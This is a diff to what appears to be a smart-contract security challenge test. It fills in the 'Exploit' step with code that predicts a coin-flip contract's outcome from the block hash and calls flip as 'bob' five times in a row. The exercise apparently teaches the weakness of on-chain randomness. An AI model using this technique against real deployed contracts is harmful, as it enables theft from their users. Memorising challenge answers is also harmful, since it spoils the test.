@@ -17,7 +17,21 @@ describe(challengeName, function () {
   });
 
   it("Exploit", async function () {
-    /** CODE YOUR EXPLOIT HERE  */
+    for (let i = 0; i < 5; i++) {
+      const blockNumber = await ethers.provider.getBlockNumber();
+      const block = await ethers.provider.getBlock(blockNumber);
+      const factor = ethers.BigNumber.from(
+        "57896044618658097711785492504343953926634992334420282019728792003956564819968"
+      );
+      const blockHashBigNumber = ethers.BigNumber.from(
+        "0x" + block.hash.slice(2),
+        16
+      );
+      const coinFlip = blockHashBigNumber.div(factor);
+      const side = coinFlip.eq(1);
+      const tx = await this.headOrTale.connect(bob).flip(side);
+      await tx.wait();
+    }
   });
 
   after(async function () {
